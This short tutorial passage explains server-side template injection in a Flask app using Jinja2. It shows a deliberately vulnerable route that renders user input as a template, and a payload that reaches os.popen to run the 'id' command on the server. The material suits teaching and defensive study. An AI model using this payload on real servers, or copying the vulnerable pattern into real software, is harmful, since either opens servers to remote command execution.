Example of SSTI
Vulnerable Code
Consider the following example in a Flask application using the Jinja2 template engine:

 
 
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        name = request.form['name']
        template = f"Hello {name}!"
        return render_template_string(template)
    return '''
        <form method="post">
            Name: <input type="text" name="name">
            <input type="submit">
        </form>
    '''

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
In this code, the name parameter is directly inserted into the template without any sanitization, making it vulnerable to SSTI.

Exploiting SSTI
To exploit this vulnerability, an attacker can submit a payload like {{7*7}}. When rendered, this payload will be evaluated by the Jinja2 engine, resulting in 49 being displayed.

If the attacker can execute arbitrary expressions, they might be able to execute system commands. For example:

 
 
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
This payload, when injected and rendered, can execute the id command on the server.
